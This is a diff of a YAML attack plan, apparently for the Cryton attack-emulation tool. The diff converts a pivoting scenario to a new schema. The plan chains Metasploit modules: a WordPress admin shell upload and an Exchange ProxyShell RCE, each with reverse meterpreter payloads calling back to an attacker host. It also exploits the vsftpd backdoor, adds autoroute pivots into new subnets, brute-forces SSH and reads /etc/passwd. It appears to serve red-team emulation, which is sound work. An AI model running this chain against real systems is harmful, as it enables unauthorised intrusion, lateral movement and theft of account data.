@@ -1,161 +1,125 @@
 ---
 # A pivoting example that first exploits a WordPress service and uses it to discover the next network.
 # It repeats the same process with other services (FTP, MS Exchange, SSH) that are in different networks.
-# Required modules: metasploit, command.
 
-plan:
-  name: Pivoting example
-  owner: Cryton
-  settings:
-    separator: "|"
-  stages:
-    # Stage 1
-    - name: 1-wordpress-exploitation
-      trigger_type: delta
-      trigger_args:
-        seconds: 0
+name: Pivoting example
+settings:
+  separator: "|"
+stages:
+  # Stage 1
+  1-wordpress-exploitation:
+    steps:
+      upload-php-shell:
+        is_init: true
+        module: metasploit
+        arguments:
+          module_name: unix/webapp/wp_admin_shell_upload
+          datastore:
+            RHOSTS: {{ wordpress.host }}
+            USERNAME: {{ wordpress.username }}
+            PASSWORD: {{ wordpress.password }}
+            PAYLOAD: php/meterpreter/reverse_tcp
+            LHOST: {{ cryton.host }}
+        next:
+          - type: result
+            value: ok
+            step: create-route-to-network-1
 
-      steps:
-        - name: upload-php-shell
-          is_init: true
-          step_type: worker/execute
-          arguments:
-            create_named_session: session-to-wordpress
-            module: metasploit
-            module_arguments:
-              module_name: unix/webapp/wp_admin_shell_upload
-              datastore:
-                RHOSTS: {{ wordpress.host }}
-                USERNAME: {{ wordpress.username }}
-                PASSWORD: {{ wordpress.password }}
-                PAYLOAD: php/meterpreter/reverse_tcp
-                LHOST: {{ cryton.host }}
-          next:
-            - type: result
-              value: ok
-              step: create-route-to-network-1
+      create-route-to-network-1:
+        metadata:
+          note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+        module: metasploit
+        arguments:
+          module_name: multi/manage/autoroute
+          datastore:
+            CMD: add
+            SUBNET: {{ wordpress.subnet_ip }}
+            SESSION: $upload-php-shell|session_id
 
-        - name: create-route-to-network-1
-          meta:
-            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
-          step_type: worker/execute
-          arguments:
-            module: metasploit
-            module_arguments:
-              module_name: multi/manage/autoroute
-              datastore:
-                CMD: add
-                SUBNET: {{ wordpress.subnet_ip }}
-                SESSION: $upload-php-shell|session_id
+  # Stage 2
+  2-ftp-exploitation:
+    depends_on:
+      - 1-wordpress-exploitation
+    steps:
+      exploit-ftp-server:
+        is_init: true
+        module: metasploit
+        # TODO: missing retries
+#            retries: 3
+        arguments:
+          module_name: unix/ftp/vsftpd_234_backdoor
+          datastore:
+            RHOSTS: {{ ftp.host }}
+            PAYLOAD: cmd/unix/interact
+        next:
+          - type: result
+            value: ok
+            step: create-route-to-network-2
 
-    # Stage 2
-    - name: 2-ftp-exploitation
-      trigger_type: delta
-      trigger_args:
-        seconds: 0
-      depends_on:
-        - 1-wordpress-exploitation
-      steps:
-        - name: exploit-ftp-server
-          step_type: worker/execute
-          is_init: true
-          arguments:
-            create_named_session: session-to-ftp
-            module: metasploit
-            # TODO: missing retries
-#            module_retries: 3
-            module_arguments:
-              module_name: unix/ftp/vsftpd_234_backdoor
-              datastore:
-                RHOSTS: {{ ftp.host }}
-                PAYLOAD: cmd/unix/interact
-          next:
-            - type: result
-              value: ok
-              step: create-route-to-network-2
+      create-route-to-network-2:
+        metadata:
+          note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+        module: metasploit
+        arguments:
+          module_name: multi/manage/autoroute
+          datastore:
+            CMD: add
+            SUBNET: {{ ftp.subnet_ip }}
+            SESSION: $upload-php-shell|session_id
 
-        - name: create-route-to-network-2
-          meta:
-            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
-          step_type: worker/execute
-          arguments:
-            module: metasploit
-            module_arguments:
-              module_name: multi/manage/autoroute
-              datastore:
-                CMD: add
-                SUBNET: {{ ftp.subnet_ip }}
-                SESSION: $upload-php-shell|session_id
+  # Stage 3
+  3-msf-exchange-server-exploitation:
+    depends_on:
+      - 2-ftp-exploitation
+    steps:
+      exploit-exchange-server:
+        is_init: true
+        module: metasploit
+        arguments:
+          module_name: exploit/windows/http/exchange_proxyshell_rce
+          datastore:
+            RHOSTS: {{ exchange.host }}
+            email: {{ exchange.email }}
+            PAYLOAD: windows/x64/meterpreter/reverse_tcp
+            LHOST: {{ cryton.host }}
+        next:
+          - type: result
+            value: ok
+            step: create-route-to-network-3
 
-    # Stage 3
-    - name: 3-msf-exchange-server-exploitation
-      trigger_type: delta
-      trigger_args:
-        seconds: 0
-      depends_on:
-        - 2-ftp-exploitation
-      steps:
-        - name: exploit-exchange-server
-          step_type: worker/execute
-          is_init: true
-          arguments:
-            create_named_session: session-to-exchange
-            module: metasploit
-            module_arguments:
-              module_name: exploit/windows/http/exchange_proxyshell_rce
-              datastore:
-                RHOSTS: {{ exchange.host }}
-                email: {{ exchange.email }}
-                PAYLOAD: windows/x64/meterpreter/reverse_tcp
-                LHOST: {{ cryton.host }}
-          next:
-            - type: result
-              value: ok
-              step: create-route-to-network-3
+      create-route-to-network-3:
+        metadata:
+          note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+        module: metasploit
+        arguments:
+          module_name: multi/manage/autoroute
+          datastore:
+            CMD: add
+            SUBNET: {{ exchange.subnet_ip }}
+            SESSION: $upload-php-shell|session_id
 
-        - name: create-route-to-network-3
-          meta:
-            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
-          step_type: worker/execute
-          arguments:
-            module: metasploit
-            module_arguments:
-              module_name: multi/manage/autoroute
-              datastore:
-                CMD: add
-                SUBNET: {{ exchange.subnet_ip }}
-                SESSION: $upload-php-shell|session_id
+  # Stage 4
+  4-ssh-exploitation:
+    depends_on:
+      - 3-msf-exchange-server-exploitation
+    steps:
+      bruteforce-user:
+        is_init: true
+        module: metasploit
+        arguments:
+          module_name: scanner/ssh/ssh_login
+          datastore:
+            RHOSTS: {{ ssh.host }}
+            USERNAME: {{ ssh.username }}
+            PASSWORD: {{ ssh.password }}
+            STOP_ON_SUCCESS: true
+        next:
+          - type: result
+            value: ok
+            step: get-passwd-file
 
-    # Stage 4
-    - name: 4-ssh-exploitation
-      trigger_type: delta
-      trigger_args:
-        seconds: 0
-      depends_on:
-        - 3-msf-exchange-server-exploitation
-      steps:
-        - name: bruteforce-user
-          is_init: true
-          step_type: worker/execute
-          arguments:
-            create_named_session: session-to-ssh
-            module: metasploit
-            module_arguments:
-              module_name: scanner/ssh/ssh_login
-              datastore:
-                RHOSTS: {{ ssh.host }}
-                USERNAME: {{ ssh.username }}
-                PASSWORD: {{ ssh.password }}
-                STOP_ON_SUCCESS: true
-          next:
-            - type: result
-              value: ok
-              step: get-passwd-file
-
-        - name: get-passwd-file
-          step_type: worker/execute
-          arguments:
-            use_named_session: session-to-ssh
-            module: command
-            module_arguments:
-              command: cat /etc/passwd
+      get-passwd-file:
+        module: command
+        arguments:
+          session_id: $bruteforce-user.session_id
+          command: cat /etc/passwd
